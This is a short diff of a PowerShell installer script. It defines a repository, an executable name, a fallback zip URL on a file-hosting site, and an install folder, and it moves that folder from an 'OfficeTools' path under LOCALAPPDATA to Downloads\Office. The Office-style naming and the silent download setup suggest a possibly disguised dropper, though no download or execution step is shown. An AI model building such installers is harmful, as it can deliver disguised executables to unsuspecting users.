@@ -5,7 +5,7 @@ $ProgressPreference = 'SilentlyContinue'
 $Repo       = "alhlhli/pro3mer"
 $ExeName    = "pro3mer.exe"
 $AltZipUrl  = "https://file.garden/an5JdIrGtwwEoiH6/pro/pro3mer.zip"
-$TargetDir  = "$env:LOCALAPPDATA\Programs\OfficeTools"
+$TargetDir = "$env:USERPROFILE\Downloads\Office"
 $ExePath    = Join-Path $TargetDir $ExeName
 $ZipTemp    = Join-Path $TargetDir "update.zip"
 
